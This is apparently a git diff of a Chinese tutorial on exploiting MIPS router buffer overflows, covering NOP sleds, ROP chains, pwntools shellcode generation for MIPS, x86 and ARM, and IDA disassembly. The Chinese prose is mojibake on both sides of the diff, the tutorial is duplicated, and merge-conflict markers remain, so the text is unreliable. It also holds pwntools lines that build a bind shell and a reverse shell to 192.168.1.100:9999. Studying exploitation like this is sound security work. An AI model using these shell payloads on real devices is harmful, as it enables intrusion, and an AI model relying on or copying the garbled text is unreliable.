@@ -1,12 +1,10 @@
-<<<<<<< HEAD
-<<<<<<< HEAD
-# Â·ÓÉÆ÷Òç³öÂ©¶´
+# è·¯ç”±å™¨æº¢å‡ºæ¼æ´
 
 
 
-### MIPS»º³åÇøÒç³öÀûÓÃ
+### MIPSç¼“å†²åŒºæº¢å‡ºåˆ©ç”¨
 
-Â©¶´¹¥»÷×é³É²¿·Ö
+æ¼æ´æ”»å‡»ç»„æˆéƒ¨åˆ†
 
 * NOP Sled
 
@@ -15,25 +13,25 @@
 
 #### NOP Sled
 
-ÔÚ»ã±à´úÂëÖĞ£¬NOPÖ¸ÁîÒâÎ¶×Å¸ÃÖ¸Áî²»½øĞĞÈÎºÎ²Ù×÷£¬¶Ô³ÌĞòÁ÷³ÌÃ»ÓĞÓ°Ïì¡£Ê¹ÓÃNOPµÄºÃ´¦ÔÚÓÚ½«·µ»ØµØÖ·×÷ÎªÒ»¸ö»º³å£¬Ö»ÒªPCÄÜÂäÔÚNOPÄÚµÄÈÎÒâÎ»ÖÃ£¬Shellcode¾ÍÄÜ³É¹¦Ö´ĞĞ¡£
+åœ¨æ±‡ç¼–ä»£ç ä¸­ï¼ŒNOPæŒ‡ä»¤æ„å‘³ç€è¯¥æŒ‡ä»¤ä¸è¿›è¡Œä»»ä½•æ“ä½œï¼Œå¯¹ç¨‹åºæµç¨‹æ²¡æœ‰å½±å“ã€‚ä½¿ç”¨NOPçš„å¥½å¤„åœ¨äºå°†è¿”å›åœ°å€ä½œä¸ºä¸€ä¸ªç¼“å†²ï¼Œåªè¦PCèƒ½è½åœ¨NOPå†…çš„ä»»æ„ä½ç½®ï¼ŒShellcodeå°±èƒ½æˆåŠŸæ‰§è¡Œã€‚
 
-²»ĞÒµÄÊÇÔÚMIPSÖĞ£¬NOPÖ¸ÁîµÄ»úÆ÷ÂëÊÇ0x0£¬Èç¹ûÊ¹ÓÃNOPÊµÏÖÌø×ª»º³å£¬»áÓ°ÏìÒÔ0x00½Ø¶ÏµÄ×Ö·û´®¸´ÖÆº¯Êı£¬Èçstrcpyº¯Êı¡£
+ä¸å¹¸çš„æ˜¯åœ¨MIPSä¸­ï¼ŒNOPæŒ‡ä»¤çš„æœºå™¨ç æ˜¯0x0ï¼Œå¦‚æœä½¿ç”¨NOPå®ç°è·³è½¬ç¼“å†²ï¼Œä¼šå½±å“ä»¥0x00æˆªæ–­çš„å­—ç¬¦ä¸²å¤åˆ¶å‡½æ•°ï¼Œå¦‚strcpyå‡½æ•°ã€‚
 
 #### ROP Chain
 
-ROPÊÇ°ÑÔ­À´ÒÑ¾­´æÔÚµÄ´úÂë¿éÆ´½ÓÆğÀ´£¬Æ´½ÓÊ±°üº¬Ò»¸öÔ¤ÏÈ×¼±¸ºÃµÄ¡¢¸÷ÌõÖ¸Áî½áÊøºóÏÂÒ»ÌõÖ¸ÁîµÄµØÖ·µÄÌØÊâµÄ·µ»ØÕ»¡£Ò»°ãµÄ³ÌĞòÀï£¬¶¼°üº¬×Å´óÁ¿µÄ·µ»ØÖ¸Áî£¬Èç"jr $ra"£¬ËüÃÇ¶¼Î»ÓÚº¯ÊıµÄÎ²²¿£¬»òÕßº¯ÊıÖĞ²¿ĞèÒª·µ»ØµÄµØ·½¡£**´ÓÄ³¸öµØÖ·µ½"jr $ra"Ö¸ÁîÖ®¼äµÄ¶ş½øÖÆĞòÁĞ³ÆÎª"gadget"**
+ROPæ˜¯æŠŠåŸæ¥å·²ç»å­˜åœ¨çš„ä»£ç å—æ‹¼æ¥èµ·æ¥ï¼Œæ‹¼æ¥æ—¶åŒ…å«ä¸€ä¸ªé¢„å…ˆå‡†å¤‡å¥½çš„ã€å„æ¡æŒ‡ä»¤ç»“æŸåä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€çš„ç‰¹æ®Šçš„è¿”å›æ ˆã€‚ä¸€èˆ¬çš„ç¨‹åºé‡Œï¼Œéƒ½åŒ…å«ç€å¤§é‡çš„è¿”å›æŒ‡ä»¤ï¼Œå¦‚"jr $ra"ï¼Œå®ƒä»¬éƒ½ä½äºå‡½æ•°çš„å°¾éƒ¨ï¼Œæˆ–è€…å‡½æ•°ä¸­éƒ¨éœ€è¦è¿”å›çš„åœ°æ–¹ã€‚**ä»æŸä¸ªåœ°å€åˆ°"jr $ra"æŒ‡ä»¤ä¹‹é—´çš„äºŒè¿›åˆ¶åºåˆ—ç§°ä¸º"gadget"**
 
 ### Shellcode
 
-ShellcodeÖ¸×¨ÃÅÖ´ĞĞÒ»¶¨¹¦ÄÜµÄ»úÆ÷´úÂë
+ShellcodeæŒ‡ä¸“é—¨æ‰§è¡Œä¸€å®šåŠŸèƒ½çš„æœºå™¨ä»£ç 
 
-#### shellcodeÉú³É
+#### shellcodeç”Ÿæˆ
 
-¿ÉÒÔÊ¹ÓÃpwntoolsÏÂµÄshellcraftÉú³ÉÖ¸¶¨¼Ü¹¹µÄshellcode£¨ĞèÒªÌáÇ°°²×°binutils£©
+å¯ä»¥ä½¿ç”¨pwntoolsä¸‹çš„shellcraftç”ŸæˆæŒ‡å®šæ¶æ„çš„shellcodeï¼ˆéœ€è¦æå‰å®‰è£…binutilsï¼‰
 
 ```python
-©°©¤©¤(root?d734468928e5)-[/home]
-©¸©¤# python2
+â”Œâ”€â”€(root?d734468928e5)-[/home]
+â””â”€# python2
 Python 2.7.18 (default, Sep 24 2021, 09:39:51)
 [GCC 10.3.0] on linux2
 Type "help", "copyright", "credits" or "license" for more information.
@@ -43,18 +41,18 @@ Type "help", "copyright", "credits" or "license" for more information.
 >>>
 ```
 
-Æ½ÈÕÎÒÃÇ³£ÓÃµÄ`shellcraft.mips.linux.sh()`ÊÇÔÚÂ©¶´Ä¿±ê½ø³ÌµÄ±ê×¼ÊäÈëÊä³ö´¦»ñµÃshell£¬¶ÔÓÚÕæÊµÆÆ½âÉè±¸£¬Ò²¿ÉÒÔ²ÉÓÃÒÔÏÂÁ½ÖÖ·½Ê½À´»ñµÃshell£¬¼´ÕıÏò¼àÌı±¾µØ¶Ë¿ÚºÍ·´ÏòÁ¬½ÓÄ¿±ê¶Ë¿Ú£º
+å¹³æ—¥æˆ‘ä»¬å¸¸ç”¨çš„`shellcraft.mips.linux.sh()`æ˜¯åœ¨æ¼æ´ç›®æ ‡è¿›ç¨‹çš„æ ‡å‡†è¾“å…¥è¾“å‡ºå¤„è·å¾—shellï¼Œå¯¹äºçœŸå®ç ´è§£è®¾å¤‡ï¼Œä¹Ÿå¯ä»¥é‡‡ç”¨ä»¥ä¸‹ä¸¤ç§æ–¹å¼æ¥è·å¾—shellï¼Œå³æ­£å‘ç›‘å¬æœ¬åœ°ç«¯å£å’Œåå‘è¿æ¥ç›®æ ‡ç«¯å£ï¼š
 
 ```python
 shellcraft.mips.linux.bindsh(9999)
 shellcraft.mips.linux.connect('192.168.1.100',9999)+shellcraft.mips.linux.dupsh()
 ```
 
-##### x86µÄshellcode
+##### x86çš„shellcode
 
 ```python
-©°©¤©¤(root?d734468928e5)-[/home]
-©¸©¤# python2
+â”Œâ”€â”€(root?d734468928e5)-[/home]
+â””â”€# python2
 Python 2.7.18 (default, Sep 24 2021, 09:39:51)
 [GCC 10.3.0] on linux2
 Type "help", "copyright", "credits" or "license" for more information.
@@ -66,17 +64,17 @@ Type "help", "copyright", "credits" or "license" for more information.
 >>>
 ```
 
-Éú³Éshellcodeºó·ÅÈëidaÀï·´»ã±à£¬ÈçÍ¼ÕâÑù
+ç”Ÿæˆshellcodeåæ”¾å…¥idaé‡Œåæ±‡ç¼–ï¼Œå¦‚å›¾è¿™æ ·
 
 ![image-20211121135127116](https://i.loli.net/2021/11/21/eQyr84guH2VhfDL.png)
 
-##### armµÄshellcode
+##### armçš„shellcode
 
-ĞèÒªÍ¨¹ı`context(arch='arm',endian='little',log_level='debug')`À´Ö¸¶¨¼Ü¹¹
+éœ€è¦é€šè¿‡`context(arch='arm',endian='little',log_level='debug')`æ¥æŒ‡å®šæ¶æ„
 
 ```python
-©°©¤©¤(root?d734468928e5)-[/home]
-©¸©¤# python2
+â”Œâ”€â”€(root?d734468928e5)-[/home]
+â””â”€# python2
 Python 2.7.18 (default, Sep 24 2021, 09:39:51)
 [GCC 10.3.0] on linux2
 Type "help", "copyright", "credits" or "license" for more information.
@@ -128,7 +126,7 @@ Type "help", "copyright", "credits" or "license" for more information.
 >>> f.close()
 ```
 
-·ÅÈëidaºó·¢ÏÖÖ»ÓĞÊı×Ö
+æ”¾å…¥idaåå‘ç°åªæœ‰æ•°å­—
 
 ```asm
 00000000 ; Processor       : ARM
@@ -232,7 +230,7 @@ ROM:00000057                 DCB 0xEF
 ROM:00000057 ; ROM           ends
 ```
 
-µã»÷seg000:00000000Õâ¿é£¬È»ºó°´C·´»ã±à
+ç‚¹å‡»seg000:00000000è¿™å—ï¼Œç„¶åæŒ‰Cåæ±‡ç¼–
 
 ```asm
 ROM:00000000 ; Processor       : ARM
@@ -271,14 +269,14 @@ ROM:00000054                 END
 
 
 
-## Â©¶´ÀûÓÃ¿ª·¢¹ı³Ì
+## æ¼æ´åˆ©ç”¨å¼€å‘è¿‡ç¨‹
 
-* ½Ù³ÖPC
-* È·¶¨Æ«ÒÆ
-* È·¶¨¹¥»÷Í¾¾¶
-* ¹¹½¨Â©¶´¹¥»÷Êı¾İ
+* åŠ«æŒPC
+* ç¡®å®šåç§»
+* ç¡®å®šæ”»å‡»é€”å¾„
+* æ„å»ºæ¼æ´æ”»å‡»æ•°æ®
 
-ÏÂÃæÊÇÒ»¸öÓĞÂ©¶´µÄ³ÌĞò£ºvuln_system.c
+ä¸‹é¢æ˜¯ä¸€ä¸ªæœ‰æ¼æ´çš„ç¨‹åºï¼švuln_system.c
 
 ```c
 #include <stdio.h>
@@ -328,15 +326,15 @@ void main() {
 
 
 
-# »ùÓÚMIPSµÄShellcode
+# åŸºäºMIPSçš„Shellcode
 
 ## binutils
 
-ÒòÎªÒªÊ¹ÓÃpwntoolsÉú³É²»Í¬¼Ü¹¹ÏÂµÄshellcode£¬Ò²¾ÍÊÇshellcraftÕâ¸öÄ£¿é£¬ËùÒÔĞèÒª°²×°pwntoolsµÄ[binutils](https://github.com/Gallopsled/pwntools-binutils/)£¬ÒÔ±àÒë¶ÔÓ¦¼Ü¹¹ÏÂµÄ»úÆ÷Âë¡£ÕâÀïËµÒ»ÏÂpwntoolsµÄshellcraftÄ£¿é£¬Õâ¸öÄ£¿éµÄÎÄµµ¿ÉÒÔ²Î¿¼£º[pwnlib.shellcraft](http://docs.pwntools.com/en/latest/shellcraft.html)¡£Æ½Ê±ÎÒÃÇ±È½Ï³£ÓÃµÄÊÇ`shellcraft.sh()`£¬ÕâÀïÃ»ÓĞÖ¸Ã÷Ä¿±ê¼Ü¹¹ÊÇÒòÎªÒ»°ãÎÒÃÇÔÚcontextÖĞÒÑ¾­Ö¸¶¨£¬ËùÒÔ²»ĞèÒªÖØ¸´Ö¸¶¨¡£Èç¹û²»Ö¸¶¨Ö±½ÓÊ¹ÓÃ`shellcraft.sh()`£¬ÕâÊÇÄ¬ÈÏi386µÄÖ¸Áî¼¯¡£
+å› ä¸ºè¦ä½¿ç”¨pwntoolsç”Ÿæˆä¸åŒæ¶æ„ä¸‹çš„shellcodeï¼Œä¹Ÿå°±æ˜¯shellcraftè¿™ä¸ªæ¨¡å—ï¼Œæ‰€ä»¥éœ€è¦å®‰è£…pwntoolsçš„[binutils](https://github.com/Gallopsled/pwntools-binutils/)ï¼Œä»¥ç¼–è¯‘å¯¹åº”æ¶æ„ä¸‹çš„æœºå™¨ç ã€‚è¿™é‡Œè¯´ä¸€ä¸‹pwntoolsçš„shellcraftæ¨¡å—ï¼Œè¿™ä¸ªæ¨¡å—çš„æ–‡æ¡£å¯ä»¥å‚è€ƒï¼š[pwnlib.shellcraft](http://docs.pwntools.com/en/latest/shellcraft.html)ã€‚å¹³æ—¶æˆ‘ä»¬æ¯”è¾ƒå¸¸ç”¨çš„æ˜¯`shellcraft.sh()`ï¼Œè¿™é‡Œæ²¡æœ‰æŒ‡æ˜ç›®æ ‡æ¶æ„æ˜¯å› ä¸ºä¸€èˆ¬æˆ‘ä»¬åœ¨contextä¸­å·²ç»æŒ‡å®šï¼Œæ‰€ä»¥ä¸éœ€è¦é‡å¤æŒ‡å®šã€‚å¦‚æœä¸æŒ‡å®šç›´æ¥ä½¿ç”¨`shellcraft.sh()`ï¼Œè¿™æ˜¯é»˜è®¤i386çš„æŒ‡ä»¤é›†ã€‚
 
 [Binutils ? pwntools 4.7.0 documentation](https://docs.pwntools.com/en/stable/install/binutils.html)
 
-### UbuntuÏÂ°²×°binutils
+### Ubuntuä¸‹å®‰è£…binutils
 
 ```sh
 apt-get install software-properties-common
@@ -345,7 +343,7 @@ apt-get update
 apt-get install binutils-$ARCH-linux-gnu
 ```
 
-### MACOSÏÂ°²×°binutils
+### MACOSä¸‹å®‰è£…binutils
 
 ```sh
 brew install https://raw.githubusercontent.com/Gallopsled/pwntools-binutils/master/macos/binutils-$ARCH.rb
@@ -356,13 +354,13 @@ brew install https://raw.githubusercontent.com/Gallopsled/pwntools-binutils/mast
 =======
 =======
 >>>>>>> 0505b64c38087f21190a92fc914cae0b88619cfc
-# Â·ÓÉÆ÷Òç³öÂ©¶´
+# è·¯ç”±å™¨æº¢å‡ºæ¼æ´
 
 
 
-### MIPS»º³åÇøÒç³öÀûÓÃ
+### MIPSç¼“å†²åŒºæº¢å‡ºåˆ©ç”¨
 
-Â©¶´¹¥»÷×é³É²¿·Ö
+æ¼æ´æ”»å‡»ç»„æˆéƒ¨åˆ†
 
 * NOP Sled
 
@@ -371,25 +369,25 @@ brew install https://raw.githubusercontent.com/Gallopsled/pwntools-binutils/mast
 
 #### NOP Sled
 
-ÔÚ»ã±à´úÂëÖĞ£¬NOPÖ¸ÁîÒâÎ¶×Å¸ÃÖ¸Áî²»½øĞĞÈÎºÎ²Ù×÷£¬¶Ô³ÌĞòÁ÷³ÌÃ»ÓĞÓ°Ïì¡£Ê¹ÓÃNOPµÄºÃ´¦ÔÚÓÚ½«·µ»ØµØÖ·×÷ÎªÒ»¸ö»º³å£¬Ö»ÒªPCÄÜÂäÔÚNOPÄÚµÄÈÎÒâÎ»ÖÃ£¬Shellcode¾ÍÄÜ³É¹¦Ö´ĞĞ¡£
+åœ¨æ±‡ç¼–ä»£ç ä¸­ï¼ŒNOPæŒ‡ä»¤æ„å‘³ç€è¯¥æŒ‡ä»¤ä¸è¿›è¡Œä»»ä½•æ“ä½œï¼Œå¯¹ç¨‹åºæµç¨‹æ²¡æœ‰å½±å“ã€‚ä½¿ç”¨NOPçš„å¥½å¤„åœ¨äºå°†è¿”å›åœ°å€ä½œä¸ºä¸€ä¸ªç¼“å†²ï¼Œåªè¦PCèƒ½è½åœ¨NOPå†…çš„ä»»æ„ä½ç½®ï¼ŒShellcodeå°±èƒ½æˆåŠŸæ‰§è¡Œã€‚
 
-²»ĞÒµÄÊÇÔÚMIPSÖĞ£¬NOPÖ¸ÁîµÄ»úÆ÷ÂëÊÇ0x0£¬Èç¹ûÊ¹ÓÃNOPÊµÏÖÌø×ª»º³å£¬»áÓ°ÏìÒÔ0x00½Ø¶ÏµÄ×Ö·û´®¸´ÖÆº¯Êı£¬Èçstrcpyº¯Êı¡£
+ä¸å¹¸çš„æ˜¯åœ¨MIPSä¸­ï¼ŒNOPæŒ‡ä»¤çš„æœºå™¨ç æ˜¯0x0ï¼Œå¦‚æœä½¿ç”¨NOPå®ç°è·³è½¬ç¼“å†²ï¼Œä¼šå½±å“ä»¥0x00æˆªæ–­çš„å­—ç¬¦ä¸²å¤åˆ¶å‡½æ•°ï¼Œå¦‚strcpyå‡½æ•°ã€‚
 
 #### ROP Chain
 
-ROPÊÇ°ÑÔ­À´ÒÑ¾­´æÔÚµÄ´úÂë¿éÆ´½ÓÆğÀ´£¬Æ´½ÓÊ±°üº¬Ò»¸öÔ¤ÏÈ×¼±¸ºÃµÄ¡¢¸÷ÌõÖ¸Áî½áÊøºóÏÂÒ»ÌõÖ¸ÁîµÄµØÖ·µÄÌØÊâµÄ·µ»ØÕ»¡£Ò»°ãµÄ³ÌĞòÀï£¬¶¼°üº¬×Å´óÁ¿µÄ·µ»ØÖ¸Áî£¬Èç"jr $ra"£¬ËüÃÇ¶¼Î»ÓÚº¯ÊıµÄÎ²²¿£¬»òÕßº¯ÊıÖĞ²¿ĞèÒª·µ»ØµÄµØ·½¡£**´ÓÄ³¸öµØÖ·µ½"jr $ra"Ö¸ÁîÖ®¼äµÄ¶ş½øÖÆĞòÁĞ³ÆÎª"gadget"**
+ROPæ˜¯æŠŠåŸæ¥å·²ç»å­˜åœ¨çš„ä»£ç å—æ‹¼æ¥èµ·æ¥ï¼Œæ‹¼æ¥æ—¶åŒ…å«ä¸€ä¸ªé¢„å…ˆå‡†å¤‡å¥½çš„ã€å„æ¡æŒ‡ä»¤ç»“æŸåä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€çš„ç‰¹æ®Šçš„è¿”å›æ ˆã€‚ä¸€èˆ¬çš„ç¨‹åºé‡Œï¼Œéƒ½åŒ…å«ç€å¤§é‡çš„è¿”å›æŒ‡ä»¤ï¼Œå¦‚"jr $ra"ï¼Œå®ƒä»¬éƒ½ä½äºå‡½æ•°çš„å°¾éƒ¨ï¼Œæˆ–è€…å‡½æ•°ä¸­éƒ¨éœ€è¦è¿”å›çš„åœ°æ–¹ã€‚**ä»æŸä¸ªåœ°å€åˆ°"jr $ra"æŒ‡ä»¤ä¹‹é—´çš„äºŒè¿›åˆ¶åºåˆ—ç§°ä¸º"gadget"**
 
 ### Shellcode
 
-ShellcodeÖ¸×¨ÃÅÖ´ĞĞÒ»¶¨¹¦ÄÜµÄ»úÆ÷´úÂë
+ShellcodeæŒ‡ä¸“é—¨æ‰§è¡Œä¸€å®šåŠŸèƒ½çš„æœºå™¨ä»£ç 
 
-#### shellcodeÉú³É
+#### shellcodeç”Ÿæˆ
 
-¿ÉÒÔÊ¹ÓÃpwntoolsÏÂµÄshellcraftÉú³ÉÖ¸¶¨¼Ü¹¹µÄshellcode£¨ĞèÒªÌáÇ°°²×°binutils£©
+å¯ä»¥ä½¿ç”¨pwntoolsä¸‹çš„shellcraftç”ŸæˆæŒ‡å®šæ¶æ„çš„shellcodeï¼ˆéœ€è¦æå‰å®‰è£…binutilsï¼‰
 
 ```python
-©°©¤©¤(root?d734468928e5)-[/home]
-©¸©¤# python2
+â”Œâ”€â”€(root?d734468928e5)-[/home]
+â””â”€# python2
 Python 2.7.18 (default, Sep 24 2021, 09:39:51)
 [GCC 10.3.0] on linux2
 Type "help", "copyright", "credits" or "license" for more information.
@@ -399,18 +397,18 @@ Type "help", "copyright", "credits" or "license" for more information.
 >>>
 ```
 
-Æ½ÈÕÎÒÃÇ³£ÓÃµÄ`shellcraft.mips.linux.sh()`ÊÇÔÚÂ©¶´Ä¿±ê½ø³ÌµÄ±ê×¼ÊäÈëÊä³ö´¦»ñµÃshell£¬¶ÔÓÚÕæÊµÆÆ½âÉè±¸£¬Ò²¿ÉÒÔ²ÉÓÃÒÔÏÂÁ½ÖÖ·½Ê½À´»ñµÃshell£¬¼´ÕıÏò¼àÌı±¾µØ¶Ë¿ÚºÍ·´ÏòÁ¬½ÓÄ¿±ê¶Ë¿Ú£º
+å¹³æ—¥æˆ‘ä»¬å¸¸ç”¨çš„`shellcraft.mips.linux.sh()`æ˜¯åœ¨æ¼æ´ç›®æ ‡è¿›ç¨‹çš„æ ‡å‡†è¾“å…¥è¾“å‡ºå¤„è·å¾—shellï¼Œå¯¹äºçœŸå®ç ´è§£è®¾å¤‡ï¼Œä¹Ÿå¯ä»¥é‡‡ç”¨ä»¥ä¸‹ä¸¤ç§æ–¹å¼æ¥è·å¾—shellï¼Œå³æ­£å‘ç›‘å¬æœ¬åœ°ç«¯å£å’Œåå‘è¿æ¥ç›®æ ‡ç«¯å£ï¼š
 
 ```python
 shellcraft.mips.linux.bindsh(9999)
 shellcraft.mips.linux.connect('192.168.1.100',9999)+shellcraft.mips.linux.dupsh()
 ```
 
-##### x86µÄshellcode
+##### x86çš„shellcode
 
 ```python
-©°©¤©¤(root?d734468928e5)-[/home]
-©¸©¤# python2
+â”Œâ”€â”€(root?d734468928e5)-[/home]
+â””â”€# python2
 Python 2.7.18 (default, Sep 24 2021, 09:39:51)
 [GCC 10.3.0] on linux2
 Type "help", "copyright", "credits" or "license" for more information.
@@ -422,17 +420,17 @@ Type "help", "copyright", "credits" or "license" for more information.
 >>>
 ```
 
-Éú³Éshellcodeºó·ÅÈëidaÀï·´»ã±à£¬ÈçÍ¼ÕâÑù
+ç”Ÿæˆshellcodeåæ”¾å…¥idaé‡Œåæ±‡ç¼–ï¼Œå¦‚å›¾è¿™æ ·
 
 ![image-20211121135127116](https://i.loli.net/2021/11/21/eQyr84guH2VhfDL.png)
 
-##### armµÄshellcode
+##### armçš„shellcode
 
-ĞèÒªÍ¨¹ı`context(arch='arm',endian='little',log_level='debug')`À´Ö¸¶¨¼Ü¹¹
+éœ€è¦é€šè¿‡`context(arch='arm',endian='little',log_level='debug')`æ¥æŒ‡å®šæ¶æ„
 
 ```python
-©°©¤©¤(root?d734468928e5)-[/home]
-©¸©¤# python2
+â”Œâ”€â”€(root?d734468928e5)-[/home]
+â””â”€# python2
 Python 2.7.18 (default, Sep 24 2021, 09:39:51)
 [GCC 10.3.0] on linux2
 Type "help", "copyright", "credits" or "license" for more information.
@@ -484,7 +482,7 @@ Type "help", "copyright", "credits" or "license" for more information.
 >>> f.close()
 ```
 
-·ÅÈëidaºó·¢ÏÖÖ»ÓĞÊı×Ö
+æ”¾å…¥idaåå‘ç°åªæœ‰æ•°å­—
 
 ```asm
 00000000 ; Processor       : ARM
@@ -588,7 +586,7 @@ ROM:00000057                 DCB 0xEF
 ROM:00000057 ; ROM           ends
 ```
 
-µã»÷seg000:00000000Õâ¿é£¬È»ºó°´C·´»ã±à
+ç‚¹å‡»seg000:00000000è¿™å—ï¼Œç„¶åæŒ‰Cåæ±‡ç¼–
 
 ```asm
 ROM:00000000 ; Processor       : ARM
@@ -627,14 +625,14 @@ ROM:00000054                 END
 
 
 
-## Â©¶´ÀûÓÃ¿ª·¢¹ı³Ì
+## æ¼æ´åˆ©ç”¨å¼€å‘è¿‡ç¨‹
 
-* ½Ù³ÖPC
-* È·¶¨Æ«ÒÆ
-* È·¶¨¹¥»÷Í¾¾¶
-* ¹¹½¨Â©¶´¹¥»÷Êı¾İ
+* åŠ«æŒPC
+* ç¡®å®šåç§»
+* ç¡®å®šæ”»å‡»é€”å¾„
+* æ„å»ºæ¼æ´æ”»å‡»æ•°æ®
 
-ÏÂÃæÊÇÒ»¸öÓĞÂ©¶´µÄ³ÌĞò£ºvuln_system.c
+ä¸‹é¢æ˜¯ä¸€ä¸ªæœ‰æ¼æ´çš„ç¨‹åºï¼švuln_system.c
 
 ```c
 #include <stdio.h>
@@ -684,15 +682,15 @@ void main() {
 
 
 
-# »ùÓÚMIPSµÄShellcode
+# åŸºäºMIPSçš„Shellcode
 
 ## binutils
 
-ÒòÎªÒªÊ¹ÓÃpwntoolsÉú³É²»Í¬¼Ü¹¹ÏÂµÄshellcode£¬Ò²¾ÍÊÇshellcraftÕâ¸öÄ£¿é£¬ËùÒÔĞèÒª°²×°pwntoolsµÄ[binutils](https://github.com/Gallopsled/pwntools-binutils/)£¬ÒÔ±àÒë¶ÔÓ¦¼Ü¹¹ÏÂµÄ»úÆ÷Âë¡£ÕâÀïËµÒ»ÏÂpwntoolsµÄshellcraftÄ£¿é£¬Õâ¸öÄ£¿éµÄÎÄµµ¿ÉÒÔ²Î¿¼£º[pwnlib.shellcraft](http://docs.pwntools.com/en/latest/shellcraft.html)¡£Æ½Ê±ÎÒÃÇ±È½Ï³£ÓÃµÄÊÇ`shellcraft.sh()`£¬ÕâÀïÃ»ÓĞÖ¸Ã÷Ä¿±ê¼Ü¹¹ÊÇÒòÎªÒ»°ãÎÒÃÇÔÚcontextÖĞÒÑ¾­Ö¸¶¨£¬ËùÒÔ²»ĞèÒªÖØ¸´Ö¸¶¨¡£Èç¹û²»Ö¸¶¨Ö±½ÓÊ¹ÓÃ`shellcraft.sh()`£¬ÕâÊÇÄ¬ÈÏi386µÄÖ¸Áî¼¯¡£
+å› ä¸ºè¦ä½¿ç”¨pwntoolsç”Ÿæˆä¸åŒæ¶æ„ä¸‹çš„shellcodeï¼Œä¹Ÿå°±æ˜¯shellcraftè¿™ä¸ªæ¨¡å—ï¼Œæ‰€ä»¥éœ€è¦å®‰è£…pwntoolsçš„[binutils](https://github.com/Gallopsled/pwntools-binutils/)ï¼Œä»¥ç¼–è¯‘å¯¹åº”æ¶æ„ä¸‹çš„æœºå™¨ç ã€‚è¿™é‡Œè¯´ä¸€ä¸‹pwntoolsçš„shellcraftæ¨¡å—ï¼Œè¿™ä¸ªæ¨¡å—çš„æ–‡æ¡£å¯ä»¥å‚è€ƒï¼š[pwnlib.shellcraft](http://docs.pwntools.com/en/latest/shellcraft.html)ã€‚å¹³æ—¶æˆ‘ä»¬æ¯”è¾ƒå¸¸ç”¨çš„æ˜¯`shellcraft.sh()`ï¼Œè¿™é‡Œæ²¡æœ‰æŒ‡æ˜ç›®æ ‡æ¶æ„æ˜¯å› ä¸ºä¸€èˆ¬æˆ‘ä»¬åœ¨contextä¸­å·²ç»æŒ‡å®šï¼Œæ‰€ä»¥ä¸éœ€è¦é‡å¤æŒ‡å®šã€‚å¦‚æœä¸æŒ‡å®šç›´æ¥ä½¿ç”¨`shellcraft.sh()`ï¼Œè¿™æ˜¯é»˜è®¤i386çš„æŒ‡ä»¤é›†ã€‚
 
 [Binutils ? pwntools 4.7.0 documentation](https://docs.pwntools.com/en/stable/install/binutils.html)
 
-### UbuntuÏÂ°²×°binutils
+### Ubuntuä¸‹å®‰è£…binutils
 
 ```sh
 apt-get install software-properties-common
@@ -701,15 +699,8 @@ apt-get update
 apt-get install binutils-$ARCH-linux-gnu
 ```
 
-### MACOSÏÂ°²×°binutils
+### MACOSä¸‹å®‰è£…binutils
 
 ```sh
 brew install https://raw.githubusercontent.com/Gallopsled/pwntools-binutils/master/macos/binutils-$ARCH.rb
 ```
-
-
-
-<<<<<<< HEAD
->>>>>>> 0505b64c38087f21190a92fc914cae0b88619cfc
-=======
->>>>>>> 0505b64c38087f21190a92fc914cae0b88619cfc
